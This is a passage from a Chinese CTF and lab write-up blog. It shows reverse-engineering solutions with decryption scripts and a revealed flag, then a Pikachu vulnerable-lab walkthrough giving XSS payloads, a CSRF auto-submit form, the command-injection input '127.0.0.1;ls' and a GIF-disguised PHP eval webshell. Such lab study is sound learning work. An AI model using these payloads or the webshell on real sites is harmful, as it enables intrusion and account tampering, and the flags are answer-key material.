<p>sub_171E\u662f\u5224\u65ad\uff0c\u6240\u4ee5\u8fdb\u53bb\u770b</p> <pre><code>__int64 __fastcall sub_171E(char a1)\n{\n  unsigned int v2; // [rsp+18h] [rbp-8h]\n  unsigned int v3; // [rsp+1Ch] [rbp-4h]\n\n  v2 = dword_4468;\n  v3 = dword_446C;\n  switch ( a1 )\n  {\n    case 'w':\n      v2 = dword_4468 - 1;\n      break;\n    case 's':\n      v2 = dword_4468 + 1;\n      break;\n    case 'a':\n      v3 = dword_446C - 1;\n      break;\n    case 'd':\n      v3 = dword_446C + 1;\n      break;\n  }\n  if ( (unsigned __int8)sub_1486(v2, v3) )\n  {\n    dword_4468 = v2;\n    dword_446C = v3;\n    sub_14FA(v2, v3);\n    if ( byte_4140[40 * dword_4468 + dword_446C] == 35 )\n    {\n      sub_1805();\n      return 1LL;\n    }\n  }\n  else\n  {\n    puts(asc_2242);\n  }\n  return 0LL;\n}\n</code></pre> <p>\u8fdb\u5165sub_1805</p> <pre><code>int sub_1805()\n{\n  unsigned __int8 v1; // [rsp+Bh] [rbp-5h]\n  int i; // [rsp+Ch] [rbp-4h]\n\n  putchar(10);\n  for ( i = 0; i &lt;= 38; ++i )\n  {\n    v1 = byte_4020[i] ^ byte_4060[i];\n    if ( v1 &lt;= 0x1Fu || v1 &gt; 0x7Eu )\n      putchar(46);\n    else\n      putchar(v1);\n  }\n  return putchar(10);\n}\n</code></pre> <p>\u770b\u5230byte_4020\uff0cbyte_4060\u6709\u5f02\u6216</p> <p>sub_14FA\uff1a</p> <pre><code>int __fastcall sub_14FA(int a1, int a2)\n{\n  __int64 v2; // rdx\n  int result; // eax\n  __int64 v4; // rdx\n  int v5; // eax\n  char v6; // [rsp+13h] [rbp-Dh]\n  int i; // [rsp+14h] [rbp-Ch]\n  unsigned int v8; // [rsp+18h] [rbp-8h]\n  int v9; // [rsp+1Ch] [rbp-4h]\n\n  v2 = 40LL * a1 + a2;\n  result = (unsigned __int8)byte_4140[v2];\n  v6 = byte_4140[v2];\n  if ( v6 &gt; 48 &amp;&amp; v6 &lt;= 52 )\n  {\n    v4 = 40LL * a1 + a2;\n    result = byte_4480[v4] ^ 1;\n    if ( byte_4480[v4] != 1 )\n    {\n      v8 = v6 - 48;\n      v5 = time(0LL);\n      srand(v5 ^ (31 * a1 + 17 * a2));\n      v9 = rand() % 5 + 1;\n      if ( v9 &gt; 0 &amp;&amp; v9 &lt;= 4 )\n      {\n        printf(\"\u6d63\u72b3\u5beb\u93b4\u6964oss %d\u6fb6\u8fab\u89e6\u951b\u5c7e\u7236\u93b4\u5fd5\u7ca8\u93c9\u71c2\u7d12\\n\", v8);\n        exit(1);\n      }\n      for ( i = 0; i &lt;= 38; ++i )\n      {\n        switch ( v6 )\n        {\n          case '1':\n            --byte_4020[i];\n            break;\n          case '2':\n            byte_4020[i] -= 2;\n            break;\n          case '3':\n            byte_4020[i] += 3;\n            break;\n          case '4':\n            byte_4020[i] += 4;\n            break;\n        }\n      }\n      byte_4480[40 * a1 + a2] = 1;\n      return printf(asc_222A, v8);\n    }\n  }\n  return result;\n}\n</code></pre> <p>\u8fd9\u91cc\u5bf9\u8fdb\u884c\u4e864\u6b21\u64cd\u4f5c\uff0c-1-2+3+4\uff0c\u6240\u4ee5\u5728\u811a\u672c\u4e0a\u52a0\u4e0a\uff0c\u63d0\u51fa\u6765byte_4020\u548cbyte_4060</p> <pre><code>a=[0x22,0xC6,0x39,0x8E,0xDC,0x0B,0x59,0x4C,0xFA,0xA3,0x05,0x86,0xCF,0x3D,0xB7,0x1D,0x63,0xAC,0x2E,0xEF,0x44,0x97,0x5C,0x7B,0xD2,0x08,0x89,0xB9,0x36,0xC9,0x4A,0x13,0x9C,0xDE,0x29,0x6C,0xF7,0x53,0x82,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00]\nb=[0x40,0xA6,0x5C,0xF5,0x9B,0x4B,0x38,0x36,0x9B,0xC6,0x7D,0xEF,0xB7,0x1E,0xD9,0x11,0x14,0xC3,0x6D,0x92,0x26,0xFF,0x3F,0x08,0xB7,0x60,0xE6,0xD8,0x5E,0x92,0x01,0x62,0xD4,0xBD,0x60,0x11,0x81,0x32,0xFB,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00]\n\nfor i in range(len(a)):\n    a[i]-=1\n    a[i]-=2\n    a[i]+=3\n    a[i]+=4\n    a[i] = a[i] ^ b[i]\n    print(chr(a[i]), end=\"\")\n</code></pre>"},{"location":"reverse/%E5%B1%B1%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-rev/#error","title":"error","text":"<p>ida\u6253\u5f00\u5230main\uff0c\u53cd\u7f16\u8bd1</p> <p></p> <p>\u53d1\u73b0\u8fd9\u91cc\u5bf9s1\u548cs2\u8fdb\u884c\u4e86\u6bd4\u8f83</p> <p>\u63d0\u51fa\u6765s2='d2e7f6d2f17123532dd8996ec04d94a6912dafd6f1b37c1d264d43a91d804d63542ef89b'</p> <p>\u770bsub_127E\u662f\u52a0\u5bc6\u64cd\u4f5c\uff0c\u6240\u4ee5\u8ba9gpt\u5199\uff0c\u4f46\u662f\u4e71\u7801\uff0c\u89c2\u5bdf\u6c47\u7f16\uff0c\u53d1\u73b0loc_12A7\u4e2d</p> <p></p> <p>\u6240\u4ee5\u628a12AE\u8fd9\u91cc\u6539\u62101</p> <p></p> <p>\u4e4b\u540e\u4ee3\u7801\u5c31\u5b8c\u6574\u4e86\uff0c\u6254\u7ed9gpt</p> <pre><code>__int64 __fastcall sub_127E(__int64 a1, int a2)\n{\n  __int64 result; // rax\n  char v3; // [rsp+1Ah] [rbp-1Eh]\n  char v4; // [rsp+1Bh] [rbp-1Dh]\n  int i; // [rsp+1Ch] [rbp-1Ch]\n  int j; // [rsp+20h] [rbp-18h]\n  int m; // [rsp+24h] [rbp-14h]\n  int k; // [rsp+28h] [rbp-10h]\n\n  for ( i = 0; ; ++i )\n  {\n    result = 3LL;\n    if ( i &gt;= 3 )\n      break;\n    for ( j = 0; j &lt; a2; ++j )\n    {\n      *(_BYTE *)(j + a1) ^= byte_2060[j % 16];\n      *(_BYTE *)(j + a1) = sub_1249(*(unsigned __int8 *)(j + a1), (unsigned int)(i + 1));\n    }\n    if ( (i &amp; 1) != 0 )\n    {\n      for ( k = 0; k &lt; a2 / 2; ++k )\n      {\n        v3 = *(_BYTE *)(k + a1);\n        *(_BYTE *)(k + a1) = *(_BYTE *)(a2 - 1 - k + a1);\n        *(_BYTE *)(a1 + a2 - 1 - k) = v3;\n      }\n    }\n    else\n    {\n      for ( m = 0; m &lt; a2 - 1; m += 2 )\n      {\n        v4 = *(_BYTE *)(m + a1);\n        *(_BYTE *)(m + a1) = *(_BYTE *)(m + 1LL + a1);\n        *(_BYTE *)(a1 + m + 1LL) = v4;\n      }\n    }\n  }\n  return result;\n}\n</code></pre> <p>https://chatgpt.com/share/e/68d75349-faf8-8005-9b4d-0c997b462607</p> <p>\u89e3\u5bc6\u9700\u6309 i=2\u21920 \u9006\u5e8f\u6267\u884c\uff0c\u5148\u8fd8\u539f\u7f6e\u6362\uff08i \u5076\u6570\uff1a\u4e24\u4e24\u4ea4\u6362\uff1bi \u5947\u6570\uff1a\u6574\u4f53\u53cd\u8f6c\uff09\uff0c\u518d\u5bf9\u6bcf\u5b57\u8282\u505a<code>inv_sub_1249(x, i+1)</code>\uff0c\u6700\u540e\u5f02\u6216\u540c\u4e00\u8f6e\u5bc6\u94a5 <code>byte_2060[j%16]</code>\u3002\u4e0b\u9762\u7ed9\u51fa Python \u811a\u672c\uff0c\u9ed8\u8ba4\u628a <code>sub_1249</code> \u89c6\u4e3a\u201c\u5de6\u5faa\u73af\u4f4d\u79fb ROL n\u201d\uff0c\u5176\u9006\u4e3a\u201c\u53f3\u5faa\u73af\u4f4d\u79fb ROR n\u201d</p> <p>\u62ffbyte_2060=[</p> <p>0x1A, 0x2B, 0x3C, 0x4D, 0x5E, 0x6F, 0x70, 0x81, 0x92, 0xA3, </p> <p>0xB4, 0xC5, 0xD6, 0xE7, 0xF8, 0x09, 0x10, 0x00, 0x00, 0x00, </p> <p>0x03, 0x00, 0x00, 0x00]</p> <pre><code># -*- coding: utf-8 -*-\nfrom typing import ByteString\n\nKEY = [\n    0x1A, 0x2B, 0x3C, 0x4D, 0x5E, 0x6F, 0x70, 0x81,\n    0x92, 0xA3, 0xB4, 0xC5, 0xD6, 0xE7, 0xF8, 0x09,\n]\n# \u4ec5\u7528\u524d16\u5b57\u8282\uff1b\u5176\u4f59 db \u672a\u88ab\u7528\u5230\uff0c\u56e0\u4e3a\u4ee3\u7801\u91cc j % 16\n\ndef ror8(x: int, n: int) -&gt; int:\n    n &amp;= 7\n    return ((x &gt;&gt; n) | ((x &lt;&lt; (8 - n)) &amp; 0xFF)) &amp; 0xFF\n\ndef inv_sub_1249(x: int, n: int) -&gt; int:\n    # \u5047\u8bbe sub_1249 \u662f ROL(x, n)\uff0c\u9006\u4e3a ROR(x, n)\n    return ror8(x, n)\n\ndef undo_pair_swap(b: bytearray) -&gt; None:\n    for m in range(0, len(b) - 1, 2):\n        b[m], b[m + 1] = b[m + 1], b[m]\n\ndef undo_reverse(b: bytearray) -&gt; None:\n    b.reverse()\n\ndef decrypt(buf: ByteString) -&gt; bytes:\n    b = bytearray(buf)\n    for i in (2, 1, 0):\n        if (i &amp; 1) != 0:\n            undo_reverse(b)\n        else:\n            undo_pair_swap(b)\n        for j in range(len(b)):\n            b[j] = inv_sub_1249(b[j], (i + 1) &amp; 0xFF)\n            b[j] ^= KEY[j % 16]\n    return bytes(b)\n\nif __name__ == \"__main__\":\n    # \u786c\u7f16\u7801\u5341\u516d\u8fdb\u5236\u5bc6\u6587\n    s = \"d2e7f6d2f17123532dd8996ec04d94a6912dafd6f1b37c1d264d43a91d804d63542ef89b\"\n    data = bytes.fromhex(s)\n\n    plain = decrypt(data)\n\n    import sys\n    try:\n        sys.stdout.buffer.write(plain)\n    except BrokenPipeError:\n        pass\n#flag{Th1s_1s_My_S1mpl3_Fl4g_f0r_CTF}\n</code></pre> <p> by. HuajiHD </p>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/","title":"Pikachu\u9776\u573a","text":"<p>\u4e00\u76f4\u5fd8\u4e86\u5237\u8fd9\u4e2a\u9776\u573a\u4e86\uff0c\u56fd\u5e86\u7ed3\u675f\u60f3\u8d77\u6765\u505a\u4e00\u4e0b\uff0c\u5185\u5bb9\u90fd\u975e\u5e38\u57fa\u7840\u6240\u4ee5\u5199\u7684\u6bd4\u8f83\u7b80\u5355\uff0c\u6ca1\u6709\u522b\u7684\u5927\u4f6c\u7684\u535a\u5ba2\u5185\u5bb9\u5199\u7684\u6e05\u6670\u3002</p>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#_1","title":"\u66b4\u529b\u7834\u89e3","text":""},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#_2","title":"\u57fa\u4e8e\u8868\u5355\u7684\u66b4\u529b\u7834\u89e3","text":"<p>\u53d1\u73b0/vul/burteforce/bf_form.php\u662f\u63d0\u4ea4\u7528\u7684\uff0cpost\u8bf7\u6c42\u4f53\u91cc\u6709<code>username=123&amp;password=123&amp;submit=Login</code>\uff0c\u6240\u4ee5\u6254\u5230burpsuite\u91cc\u7684intruder\u76f4\u63a5\u7206\u7834\u5373\u53ef</p> <p></p>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#onserver","title":"\u9a8c\u8bc1\u7801\u7ed5\u8fc7(onserver\uff09","text":"<p>\u8f93\u5165\u9a8c\u8bc1\u7801\u540e\u53d1\u73b0\u9a8c\u8bc1\u7801\u957f\u671f\u6709\u6548\uff0c\u6240\u4ee5\u5185\u5bb9\u5e94\u8be5\u540c\u57fa\u4e8e\u8868\u5355\u7684\u66b4\u529b\u7834\u89e3\u4e2d\u7684\u5185\u5bb9\u3002</p>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#onclient","title":"\u9a8c\u8bc1\u7801\u7ed5\u8fc7(onclient)","text":"<pre><code>&lt;script language=\"javascript\" type=\"text/javascript\"&gt;\n    var code; //\u5728\u5168\u5c40 \u5b9a\u4e49\u9a8c\u8bc1\u7801\n    function createCode() {\n        code = \"\";\n        var codeLength = 5;//\u9a8c\u8bc1\u7801\u7684\u957f\u5ea6\n        var checkCode = document.getElementById(\"checkCode\");\n        var selectChar = new Array(0, 1, 2, 3, 4, 5, 6, 7, 8, 9,'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z');//\u6240\u6709\u5019\u9009\u7ec4\u6210\u9a8c\u8bc1\u7801\u7684\u5b57\u7b26\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u7528\u4e2d\u6587\u7684\n\n        for (var i = 0; i &lt; codeLength; i++) {\n            var charIndex = Math.floor(Math.random() * 36);\n            code += selectChar[charIndex];\n        }\n        //alert(code);\n        if (checkCode) {\n            checkCode.className = \"code\";\n            checkCode.value = code;\n        }\n    }\n\n    function validate() {\n        var inputCode = document.querySelector('#bf_client .vcode').value;\n        if (inputCode.length &lt;= 0) {\n            alert(\"\u8bf7\u8f93\u5165\u9a8c\u8bc1\u7801\uff01\");\n            return false;\n        } else if (inputCode != code) {\n            alert(\"\u9a8c\u8bc1\u7801\u8f93\u5165\u9519\u8bef\uff01\");\n            createCode();//\u5237\u65b0\u9a8c\u8bc1\u7801\n            return false;\n        }\n        else {\n            return true;\n        }\n    }\n\n\n    createCode();\n&lt;/script&gt;\n</code></pre> <p>\u53d1\u73b0\u53ea\u6709\u524d\u7aef\u5bf9\u9a8c\u8bc1\u7801\u8fdb\u884c\u6821\u9a8c\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u5ffd\u7565\u6389\uff0c\u5185\u5bb9\u4e5f\u4e0e\u57fa\u4e8e\u8868\u5355\u7684\u66b4\u529b\u7834\u89e3\u4e2d\u76f8\u540c\u3002</p> <p></p>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#token","title":"token\u9632\u7206\u7834?","text":"<p>\u6293\u5305\uff0c\u53d1\u73b0\u8bf7\u6c42\u4f53\u4e2d\u591a\u4e86\u4e00\u4e2atoken\u53c2\u6570\uff0c\u6240\u4ee5\u53c8\u89c2\u5bdf\u5230\u5728html\u8868\u5355\u4e2d\u6709\u4e00\u4e2a\u9690\u85cf\u7684token\uff0c\u6240\u4ee5\u8003\u8651\u7528pitchfork\uff0c</p> <p>\u4fee\u6539token\u7684payload\uff0c\u70b9\u51fb\u8bbe\u7f6e\u91cc\u7684<code>Grep\u2014Extract</code>\u7684\u6dfb\u52a0\uff08\u4e2d\u6587\u5e94\u8be5\u662f\u53eb\u68c0\u7d22-\u63d0\u53d6\uff09\uff0c\u7136\u540e\u70b9\u51fb\u83b7\u53d6\u56de\u590d\uff0c\u9009\u4e2dtoken\u7684\u503c\u590d\u5236\uff0c\u7136\u540e\u70b9\u51fbOK\uff0c\u4e4b\u540e\u8f93\u5165\u521d\u59cb\u503c</p> <p></p> <p>\u542f\u52a8\u5373\u53ef</p>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#cross-site-scripting","title":"Cross-Site Scripting","text":"<p>XSS\u539f\u7406\u4e0d\u89e3\u91ca\uff0c\u81ea\u884c\u67e5\u627e</p>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#xssget","title":"\u53cd\u5c04\u578bXSS(get\uff09","text":"<p>src\u4e0d\u6536</p> <p>\u5148\u5728\u524d\u7aef\u4fee\u6539\u8f93\u5165\u6846\u7684\u6700\u5927\u957f\u5ea6\u9650\u5236\uff0c\u7136\u540e\u63d0\u4ea4\u4e0b\u65b9\u5185\u5bb9\u5373\u53ef\uff0c\u8fd9\u4e2a\u662fget\u4f20\u53c2</p> <pre><code>&lt;script&gt;alert(1);&lt;/script&gt;\n</code></pre>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#xsspost","title":"\u53cd\u5c04\u578bXSS(post)","text":"<p>src\u4e0d\u6536</p> <p>\u5148\u7528\u5f31\u5bc6\u7801\u767b\u5f55\uff0c admin/123456\uff0c\u4e4b\u540e\u91cc\u9762\u6709\u4e2asubmit\uff0c\u63d0\u4ea4\u4e0b\u65b9\u5185\u5bb9\u5373\u53ef\uff0c\u8fd9\u4e2a\u662fpost\u4f20\u53c2</p> <pre><code>&lt;script&gt;alert(1);&lt;/script&gt;\n</code></pre>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#xss","title":"\u5b58\u50a8\u578bXSS","text":"<p>\u597d\u7528\uff0c\u5f71\u54cd\u5f88\u4e25\u91cd\u3002</p> <p>\u9898\u76ee\u90fd\u6ca1\u6709waf\uff0c\u6240\u4ee5\u5f88\u597d\u64cd\u4f5c\uff0c\u53ef\u4ee5\u7528XSS\u9493\u9c7c</p> <pre><code>&lt;script&gt;alert(1);&lt;/script&gt;\n</code></pre>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#domxss","title":"DOM\u578bXSS","text":"<p>\u5206\u6790\u4e00\u4e0b\u524d\u7aef\u7f51\u9875\u4ee3\u7801\uff0c\u53ef\u4ee5\u53d1\u73b0\u8f93\u5165\u6846\u91cc\u7684\u53c2\u6570\u4f1a\u88ab\u4f20\u9012\u7ed9A\u6807\u7b7e\u7684href\u5c5e\u6027\uff0c\u8f93\u5165\u4e0b\u65b9\u5185\u5bb9\u63d0\u4ea4\uff0c\u4e4b\u540e\u70b9\u51fb\u94fe\u63a5\u5373\u53ef\u89e6\u53d1</p> <pre><code>javascript:alert(1);\n</code></pre>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#domxss-x","title":"DOM\u578bXSS-X","text":"<p>DOM\u578bXSS-X\u5371\u5bb3\u6bd4DOM\u578bXSS\u66f4\u5927\uff0c\u53ef\u4ee5\u5728URL\u4e2d\u4f53\u73b0</p> <p>\u770b\u5230\u6e90\u7801</p> <pre><code> &lt;script&gt;\n                    function domXSS(){\n                        var str = window.location.search;\n                        var tXSS = decodeURIComponent(str.split(\"text=\")[1]);\n                        var XSS = tXSS.replace(/\\+/g,' ');\n//                        alert(XSS);\n\n                        document.getElementById(\"dom\").innerHTML = \"&lt;a href='\"+XSS+\"'&gt;\u5c31\u8ba9\u5f80\u4e8b\u90fd\u968f\u98ce,\u90fd\u968f\u98ce\u5427&lt;/a&gt;\";\n                    }\n                    //\u8bd5\u8bd5\uff1a'&gt;&lt;img src=\"#\" onmouseover=\"alert('XSS')\"&gt;\n                    //\u8bd5\u8bd5\uff1a' onclick=\"alert('XSS')\"&gt;,\u95ed\u5408\u6389\u5c31\u884c\n                &lt;/script&gt;\n</code></pre> <p>\u53d1\u73b0\u662f<code>js</code>\u51fd\u6570\u5229\u7528\u4e86<code>DOM</code>\u5c06\u5b57\u7b26\u4e32\u62fc\u63a5\u5e76\u628a\u503c\u8d4b\u7ed9a\u6807\u7b7e\u7684href\uff0c\u7136\u540e\u8f93\u51fa\u4e00\u4e2a<code>\u5c31\u8ba9\u5f80\u4e8b\u90fd\u968f\u98ce,\u90fd\u968f\u98ce\u5427</code>\uff0c\u6240\u4ee5\u6211\u4eec\u5148\u7ed9href\u62fc\u63a5\u4e0a\uff0c\u7136\u540e\u518d\u5199\u4e2aonclick1\u5c31\u80fd0\u4f60\u5b9e\u73b0</p> <pre><code>#' onclick=\"alert(111)\"&gt;\n</code></pre>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#xss_1","title":"XSS\u4e4b\u76f2\u6253","text":"<p>\u53ea\u662f\u56e0\u4e3a\u663e\u793a\u4e0d\u51fa\u6765\uff0c\u4f46\u662f\u540e\u53f0\u80fd\u770b\u89c1\uff0c\u5982\u679c\u76f2\u6253\u7684\u8bdd\u53ef\u4ee5\u5077\u5077\u64cd\u63a7\u67d0\u4e9b\u63a7\u4ef6\uff0c\u6bd4\u5982\u5b9e\u73b0\u81ea\u52a8\u63d0\u4ea4\uff1f</p> <pre><code>&lt;script&gt;alert(1);&lt;/script&gt;\n</code></pre>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#xss_2","title":"XSS\u4e4b\u8fc7\u6ee4","text":"<p>\u6362\u4e2a\u6807\u7b7e\u5373\u53ef\uff0c\u8fd9\u4e2a\u5728<code>XSS cheatshee</code>t\u91cc\u5f88\u591a</p> <pre><code>&lt;img src=xx onerror=alert(1)&gt;\n</code></pre>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#xsshtmlspecialchars","title":"XSS\u4e4bhtmlspecialchars","text":"<p><code>specialchars</code>\u8fd9\u4e2a\u51fd\u6570\u4f1a\u628a\u5355\u5f15\u53f7\uff0c\u53cc\u5f15\u53f7\uff0c\u5c16\u62ec\u53f7\u8fc7\u6ee4\u4e86\uff0c\u4f46\u662f\u8fd9\u4e2a\u51fd\u6570\u9ed8\u8ba4\u662f\u4e0d\u8fc7\u6ee4\u5355\u5f15\u53f7\u7684\uff0c\u53ea\u6709\u5c06quotestyle\u9009\u9879\u4e3aENT_QUOTES\u624d\u4f1a\u8fc7\u6ee4\u5355\u5f15\u53f7\u3002</p> <p>\u53d1\u73b0\u6b63\u5e38\u7684\u5185\u5bb9\u4f1a\u88ab\u653e\u5230href\u91cc\u9762\uff0c\u6240\u4ee5\u8f93\u5165</p> <pre><code>javascript:alert(1)\n</code></pre>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#xsshref","title":"XSS\u4e4bhref\u8f93\u51fa","text":"<p>\u6ca1\u61c2\u548chtmlspecialchars\u8003\u70b9\u6709\u4ec0\u4e48\u533a\u522b</p> <pre><code>javascript:alert(1)\n</code></pre>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#xssjs","title":"XSS\u4e4bjs\u8f93\u51fa","text":"<p>\u8981\u5148\u628a\u4e4b\u524d\u7684script\u95ed\u5408</p> <pre><code>'&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;\n&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;\n</code></pre>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#csrf","title":"CSRF","text":""},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#csrfget","title":"CSRF(get)","text":"<p>\u6293\u5305\u53ef\u4ee5\u53d1\u73b0get\u8bf7\u6c42\u91cc\u6709\u4fee\u6539\u4fe1\u606f\u7684\u5185\u5bb9\uff0c\u7be1\u6539\u53c2\u6570\u540e\u6b3a\u9a97\u7528\u6237\u70b9\u51fb\u5373\u53ef</p>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#csrfpost","title":"CSRF(post)","text":"<p>post\u8bf7\u6c42\u76f8\u6bd4\u4e4b\u4e0b\u5c31\u6ca1\u6709\u90a3\u4e48\u7b80\u5355\uff0c\u9700\u8981\u7ee7\u7eed\u8bf1\u9a97\u7528\u6237\u8fdb\u884c\u70b9\u51fb\u6309\u952e\u624d\u80fd\u5b9e\u73b0\uff0c\u6216\u8bb8\u53ef\u4ee5\u7528\u91cd\u5b9a\u5411\uff1f</p> <p></p> <p>\u6240\u4ee5\u642d\u5efa\u4e00\u4e2a\u7f51\u7ad9\u53ef\u4ee5\u91cd\u5b9a\u5411\u6765\u63d0\u4ea4\u8868\u5355\uff0c\u6216\u8005\u662f\u7528\u4e00\u4e2abutton\u6765\u63d0\u4ea4\u90fd\u53ef\u4ee5</p> <pre><code>&lt;!doctype html&gt;\n&lt;meta charset=\"utf-8\"&gt;\n&lt;title&gt;CSRF PoC&lt;/title&gt;\n&lt;form id=\"f\" method=\"post\" action=\"http://node.hackhub.get-shell.com:45751/vul/csrf/csrfpost/csrf_post_edit.php\"&gt;\n  &lt;input type=\"hidden\" name=\"sex\" value=\"123\"&gt;\n  &lt;input type=\"hidden\" name=\"phonenum\" value=\"123\"&gt;\n  &lt;input type=\"hidden\" name=\"add\" value=\"123\"&gt;\n  &lt;input type=\"hidden\" name=\"email\" value=\"123\"&gt;\n&lt;/form&gt;\n&lt;script&gt;onload=()=&gt;document.getElementById('f').submit();&lt;/script&gt;\n</code></pre>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#csrf-token","title":"CSRF Token","text":"<p>\u9020\u6210CSRF\u6f0f\u6d1e\u7684\u4e3b\u8981\u539f\u56e0\u662f\u8bf7\u6c42\u654f\u611f\u64cd\u4f5c\u7684\u6570\u636e\u5305\u5bb9\u6613\u88ab\u4f2a\u9020,\u53ea\u8981\u5728\u6bcf\u6b21\u8bf7\u6c42\u65f6\u90fd\u589e\u52a0\u4e00\u4e2a<code>Token</code>\uff0c \u6bcf\u6b21\u64cd\u4f5c\u7684\u65f6\u5019\u8fdb\u884c\u9a8c\u8bc1\uff0c\u53ef\u4ee5\u6709\u6548\u5730\u9632\u6b62csrf\uff0c\u56e0\u4e3acsrf\u7684\u65f6\u5019\u90fd\u4e0d\u80fd\u62ff\u5230token</p>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#sql-inject","title":"SQL-Inject","text":"<p>\u540e\u9762\u4f1a\u76f4\u63a5\u505asql-lab\u6240\u4ee5\u4e0d\u5728\u8fd9\u91cc\u7ec6\u5199</p>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#rce","title":"RCE","text":"<p>\u8d85\u7ea7\u57fa\u7840\u7684rce</p>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#exec-ping","title":"exec \"ping\"","text":"<p>\u7528<code>;</code>\u8fdb\u884c\u622a\u65ad\uff0c\u6216\u8005\u7528<code>&amp;</code>\u3001<code>|</code>\u3001<code>&amp;&amp;</code>\u548c<code>||</code>\u90fd\u53ef\u4ee5</p> <pre><code>127.0.0.1;ls\n</code></pre>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#exec-eval","title":"exec \"eval\"","text":"<p>eval\u5c5e\u4e8e\u5371\u9669\u51fd\u6570\uff0c\u53ef\u4ee5\u6267\u884cphp\u547d\u4ee4\uff0c\u5199\u9a6c\u6267\u884csystem\u90fd\u53ef\u4ee5</p> <pre><code>system('ls');\n</code></pre>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#file-inclusion","title":"File Inclusion","text":""},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#file-inclusionlocal","title":"File Inclusion(local)","text":"<p>\u63a7\u5236filename\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\uff0c\u4f46\u662f\u597d\u50cf\u4e0d\u80fd\u9000\u51fa\u8fd9\u4e2a\u76ee\u5f55</p> <pre><code>http://node.hackhub.get-shell.com:48833/vul/fileinclude/fi_local.php?filename=file6.php&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2\n</code></pre>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#file-inclusionremote","title":"File Inclusion(remote)","text":"<p>\u5728\u7ebf\u9776\u573a\u663e\u793a<code>warning:\u4f60\u7684allow_url_include\u6ca1\u6709\u6253\u5f00,\u8bf7\u5728php.ini\u4e2d\u6253\u5f00\u4e86\u518d\u6d4b\u8bd5\u8be5\u6f0f\u6d1e,\u8bb0\u5f97\u4fee\u6539\u540e,\u91cd\u542f\u4e2d\u95f4\u4ef6\u670d\u52a1!</code></p>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#unsafe-filedownload","title":"Unsafe Filedownload","text":""},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#unsafe-filedownload_1","title":"Unsafe Filedownload","text":"<p>\u53ef\u4ee5\u76f4\u63a5\u5b9e\u73b0\u6587\u4ef6\u4e0b\u8f7d\uff0c</p> <pre><code>http://node.hackhub.get-shell.com:48833/vul/unsafedownload/execdownload.php?filename=file6.php\n</code></pre>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#unsafe-fileupload","title":"Unsafe Fileupload","text":""},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#client-check","title":"client check","text":"<p>\u524d\u7aef\u68c0\u6d4b\u65e0\u610f\u4e49\uff0c\u5173\u6389js\u52a0\u8f7d\u6216\u8005\u76f4\u63a5\u53d1\u5305\u90fd\u53ef\u4ee5</p> <pre><code>GIF89a\n&lt;?php  @eval($_REQUEST['huaji']);?&gt;\n</code></pre> <p></p>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#mime-type","title":"MIME type","text":"<p>\u6539Content-Type\u5373\u53ef\uff0c</p> <p></p>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#getimagesize","title":"getimagesize","text":"<p><code>getimagesize()</code>\u51fd\u6570\u4f1a\u901a\u8fc7\u8bfb\u53d6\u6587\u4ef6\u5934\u90e8\u7684\u51e0\u4e2a\u5b57\u7b26\u4e32(\u5373\u6587\u4ef6\u5934), \u6765\u5224\u65ad\u662f\u5426\u4e3a\u6b63\u5e38\u56fe\u7247\u7684\u5934\u90e8</p> 